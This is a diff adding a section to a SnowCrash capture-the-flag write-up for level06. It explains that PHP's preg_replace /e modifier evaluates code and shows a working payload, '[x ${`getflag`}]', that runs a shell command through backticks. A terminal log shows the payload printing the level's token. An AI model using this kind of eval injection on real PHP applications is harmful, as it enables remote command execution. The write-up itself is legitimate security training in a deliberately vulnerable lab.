@@ -66,3 +66,24 @@ $r = x($argv[1], $argv[2]);
 print $r;
 ?>
 ```
+For line where `regex` has `/..../e`, take a look at this [link](http://www.madirish.net/402), which explains it basically executes second argument, if it fulfills the condition.
+
+And on this part of the `regex` (by `/(\[x (.*)\])/e`):
+- if `$a` is in form of `[x ${asdfa}]`, it will be first be replaced by second argument of function `"y(\"\\2\")"`
+
+**And it is possible to execute shell in PHP with backticks.**
+
+so, the sufficient form that needs to be passed will be:
+
+```
+[x ${`getflag`}]
+```
+
+```
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/testing
+level06@SnowCrash:~$ ./level06 /tmp/testing
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+level06@SnowCrash:~$
+```
